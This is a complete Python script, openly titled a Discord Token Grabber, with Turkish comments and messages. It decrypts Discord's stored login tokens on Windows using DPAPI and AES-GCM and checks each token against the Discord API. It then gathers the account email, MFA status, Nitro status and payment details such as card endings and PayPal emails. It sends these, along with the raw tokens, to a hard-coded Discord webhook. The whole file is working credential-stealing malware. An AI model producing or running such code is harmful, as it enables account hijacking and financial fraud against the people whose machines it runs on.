import os
import re
import sys
import json
import base64
import ctypes
import time
import threading
import urllib.request
import urllib.error
import traceback
from datetime import datetime, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed


# ============ CONFIG ============

WEBHOOK_URL = "https://discord.com/api/webhooks/1552366803148341248/_nR-3hCCMDAvZ78GoS1RDVfDsEiNWPj9tmz8ute66PyjHJpen6SkmslcKryhklQFearh"            # <-- BURAYA WEBHOOK URL'INI YAZ
MAX_WORKERS = 8
CHECK_TIMEOUT = 8
SEND_TIMEOUT = 10
WEBHOOK_RATE_SLEEP = 0.35


DISCORD_ROOTS = [
    Path(os.environ.get("APPDATA", "")) / "discord",
    Path(os.environ.get("APPDATA", "")) / "discordcanary",
    Path(os.environ.get("APPDATA", "")) / "discordptb",
    Path(os.environ.get("APPDATA", "")) / "Lightcord",
    Path(os.environ.get("APPDATA", "")) / "discorddevelopment",
]

TOKEN_PREFIX = b"dQw4w9WgXcQ:"
DPAPI_PREFIX = b"DPAPI"

BADGE_FLAGS = {
    1 << 0:  "Discord Employee",
    1 << 1:  "Partnered Server Owner",
    1 << 2:  "HypeSquad Events",
    1 << 3:  "Bug Hunter Level 1",
    1 << 6:  "HypeSquad Bravery",
    1 << 7:  "HypeSquad Brilliance",
    1 << 8:  "HypeSquad Balance",
    1 << 9:  "Early Supporter",
    1 << 14: "Bug Hunter Level 2",
    1 << 16: "Verified Bot",
    1 << 17: "Early Verified Bot Developer",
    1 << 18: "Moderator Programs Alumni",
    1 << 19: "Discord Certified Moderator",
    1 << 22: "Active Developer",
}

PREMIUM_TYPES = {0: "Yok", 1: "Nitro Classic", 2: "Nitro (Full)", 3: "Nitro Basic"}

_webhook_lock = threading.Lock()
_last_webhook = [0.0]


# ============ DPAPI ============

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint32),
                ("pbData", ctypes.POINTER(ctypes.c_byte))]


def dpapi_decrypt(data):
    if os.name != "nt" or not data:
        return None
    try:
        buf = (ctypes.c_byte * len(data))(*data)
        blob_in = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_byte)))
        blob_out = DATA_BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        )
        if not ok:
            return None
        try:
            size = blob_out.cbData
            ptr = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_byte * size))
            return bytes(bytearray(ptr.contents))
        finally:
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    except Exception:
        return None


# ============ TOKEN EXTRACT (RAM only) ============

def get_master_key(root):
    state_file = root / "Local State"
    if not state_file.is_file():
        return None
    try:
        state = json.loads(state_file.read_text(encoding="utf-8"))
        enc_b64 = state["os_crypt"]["encrypted_key"]
        raw = base64.b64decode(enc_b64)
        if raw.startswith(DPAPI_PREFIX):
            raw = raw[len(DPAPI_PREFIX):]
        return dpapi_decrypt(raw)
    except Exception:
        return None


def decrypt_aes_gcm(key, blob):
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return None
    try:
        if len(blob) < 3 + 12 + 16:
            return None
        if blob[:3] not in (b"v10", b"v11"):
            return None
        nonce = blob[3:15]
        payload = blob[15:]
        tag, ciphertext = payload[-16:], payload[:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except Exception:
        return None


def extract_blobs(folder):
    blobs = []
    if not folder.is_dir():
        return blobs
    b64_re = re.compile(rb"[A-Za-z0-9+/=_-]{40,}")
    for entry in folder.iterdir():
        if entry.suffix.lower() not in (".ldb", ".log"):
            continue
        try:
            data = entry.read_bytes()
        except Exception:
            continue
        idx = 0
        while True:
            pos = data.find(TOKEN_PREFIX, idx)
            if pos == -1:
                break
            idx = pos + len(TOKEN_PREFIX)
            tail = data[pos + len(TOKEN_PREFIX): pos + len(TOKEN_PREFIX) + 2048]
            m = b64_re.match(tail)
            if not m:
                continue
            try:
                blobs.append(base64.b64decode(m.group(0), validate=False))
            except Exception:
                pass
    return blobs


def extract_all_tokens():
    """Butun token'lari RAM'e cek. Hicbir dosya yazmaz."""
    tokens = set()
    for root in DISCORD_ROOTS:
        ldb = root / "Local Storage" / "leveldb"
        if not ldb.is_dir():
            continue
        print(f"[*] {root.name}")
        key = get_master_key(root)
        if not key:
            print("    master key alinamadi")
            continue
        blobs = extract_blobs(ldb)
        found = 0
        for blob in blobs:
            plain = decrypt_aes_gcm(key, blob)
            if not plain:
                continue
            try:
                text = plain.decode("utf-8", "ignore")
            except Exception:
                continue
            for m in re.finditer(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,}", text):
                tokens.add(m.group(0))
                found += 1
        print(f"    {found} token")
    return list(tokens)


# ============ HTTP ============

def _http(url, method="GET", headers=None, body=None, timeout=10):
    req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}"


def api_get(token, path, timeout=CHECK_TIMEOUT):
    status, data = _http(
        f"https://discord.com/api/v10{path}",
        headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
        timeout=timeout,
    )
    if status == 200:
        return data
    return None


# ============ HELPERS ============

def flags_to_badges(flags):
    if not flags:
        return "Yok"
    out = [n for b, n in BADGE_FLAGS.items() if flags & b]
    return ", ".join(out) if out else f"Bilinmeyen ({flags})"


def get_billing(token):
    data = api_get(token, "/users/@me/billing/payment-sources")
    if not data or not isinstance(data, list):
        return "  Yok"

    lines = []
    for src in data:
        if not isinstance(src, dict):
            continue
        stype = src.get("type", 0)
        invalid = bool(src.get("invalid", False))
        default = bool(src.get("default", False))
        durum = "GECERSIZ" if invalid else "GECERLI"
        defstr = " [DEFAULT]" if default else ""

        if stype == 1:
            brand = src.get("brand", "Kart")
            last4 = src.get("last_4", "????")
            exp_m = src.get("expires_month", "??")
            exp_y = src.get("expires_year", "??")
            lines.append(f"  💳 {brand} ****{last4} ({exp_m}/{exp_y}) -> {durum}{defstr}")
        elif stype == 2:
            email = src.get("email", "?")
            lines.append(f"  🅿️ PayPal ({email}) -> {durum}{defstr}")
        elif stype == 11:
            lines.append(f"  💸 Venmo -> {durum}{defstr}")
        elif stype == 17:
            lines.append(f"  💵 Cash App -> {durum}{defstr}")
        else:
            lines.append(f"  ❓ Tip {stype} -> {durum}{defstr}")

    return "\n".join(lines) if lines else "  Yok"


def gather(token):
    me = api_get(token, "/users/@me")
    if not me or not isinstance(me, dict):
        return None

    premium = PREMIUM_TYPES.get(me.get("premium_type", 0), "Yok")
    disc = me.get("discriminator", "0")
    uname = me.get("username", "?")
    display = f"{uname}#{disc}" if disc not in (None, "0") else uname

    avatar = me.get("avatar")
    uid = str(me.get("id", "?"))
    avatar_url = (f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128"
                  if avatar else
                  "https://cdn.discordapp.com/embed/avatars/0.png")

    return {
        "Username": display,
        "Id": uid,
        "Mail": me.get("email") or "Yok",
        "Token": token,
        "Mfa": "Var ✅" if me.get("mfa_enabled") else "Yok ❌",
        "Nitro": premium,
        "Billing": get_billing(token),
        "Badges": flags_to_badges(me.get("public_flags", 0)),
        "_avatar": avatar_url,
    }


# ============ WEBHOOK ============

def _rate_limit():
    with _webhook_lock:
        now = time.time()
        delta = now - _last_webhook[0]
        if delta < WEBHOOK_RATE_SLEEP:
            time.sleep(WEBHOOK_RATE_SLEEP - delta)
        _last_webhook[0] = time.time()


def send_webhook(url, data):
    tok = data["Token"]

    lines = [
        "```",
        tok,
        "```",
        f"👤 **Username:** `{data['Username']}`",
        f"🆔 **Id:** `{data['Id']}`",
        f"📧 **Mail:** `{data['Mail']}`",
        f"🔑 **Token:** (yukarida)",
        f"🔐 **Mfa:** `{data['Mfa']}`",
        f"💎 **Nitro:** `{data['Nitro']}`",
        f"🏅 **Badges:** `{data['Badges']}`",
        f"💳 **Billings:**",
        data["Billing"],
    ]
    desc = "\n".join(lines)
    if len(desc) > 4000:
        desc = desc[:3990] + "..."

    payload = {
        "username": "Token Logger",
        "avatar_url": data.get("_avatar"),
        "embeds": [{
            "title": "💀 Discord Token",
            "description": desc,
            "color": 0x5865F2,
            "thumbnail": {"url": data.get("_avatar")},
            "footer": {"text": f"ID: {data['Id']}"},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }],
    }
    blob = json.dumps(payload).encode("utf-8")
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    for attempt in range(3):
        _rate_limit()
        status, resp = _http(url, "POST", headers, blob, timeout=SEND_TIMEOUT)
        if status in (200, 204):
            return True
        if status == 429:
            wait = 2.0
            if isinstance(resp, dict):
                wait = float(resp.get("retry_after", 2.0)) + 0.5
            time.sleep(wait)
            continue
        print(f"    [X] webhook HTTP {status} -> {resp}")
        return False
    return False


# ============ PIPELINE ============

def process(token, url, idx, total):
    info = gather(token)
    if info is None:
        print(f"[{idx}/{total}] GECERSIZ  {token[:20]}...")
        return "invalid"
    print(f"[{idx}/{total}] GECERLI   {info['Username']} ({info['Id']})")
    ok = send_webhook(url, info)
    print(f"           -> {'gonderildi' if ok else 'GONDERILEMEDI'}")
    return "valid" if ok else "sendfail"


def main():
    print("=" * 50)
    print("Discord Token Grabber (RAM only, no files)")
    print("=" * 50)

    if not WEBHOOK_URL or not WEBHOOK_URL.strip():
        print("[X] WEBHOOK_URL doldurulmamis.")
        print("    Dosyayi ac, en ustteki WEBHOOK_URL satirini doldur.")
        return 1

    # 1) token cikar
    print("\n[1/2] Token cikariliyor (RAM)...")
    tokens = extract_all_tokens()

    if not tokens:
        print("\n[X] Hicbir token bulunamadi.")
        print("    - Discord en az bir kez acilmis ve login olunmus mu?")
        print("    - pip install pycryptodome kurulu mu?")
        return 1

    print(f"\n[+] {len(tokens)} token bulundu (RAM'de, dosyaya yazilmadi)\n")

    # 2) check + webhook
    print(f"[2/2] Check + webhook gonderiliyor ({MAX_WORKERS} worker)...\n")

    stats = {"valid": 0, "invalid": 0, "sendfail": 0}
    t0 = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = [ex.submit(process, tok, WEBHOOK_URL.strip(), i, len(tokens))
                   for i, tok in enumerate(tokens, 1)]
        for fut in as_completed(futures):
            try:
                kind = fut.result()
            except Exception as e:
                print(f"    [!] worker hatasi: {e}")
                kind = "sendfail"
            stats[kind] = stats.get(kind, 0) + 1

    dt = time.time() - t0
    print(f"\n[+] Bitti: {dt:.1f}s")
    print(f"    Gecerli & gonderilen : {stats['valid']}")
    print(f"    Gecersiz (atildi)    : {stats['invalid']}")
    print(f"    Gonderim hatasi      : {stats['sendfail']}")
    return 0


# ============ ENTRY ============

if __name__ == "__main__":
    code = 0
    try:
        code = main()
    except KeyboardInterrupt:
        print("\n[!] Iptal.")
        code = 130
    except Exception:
        print("\n[X] BEKLENMEYEN HATA:")
        traceback.print_exc()
        code = 1
    finally:
        try:
            input("\n[enter] kapat")
        except EOFError:
            pass
    sys.exit(code)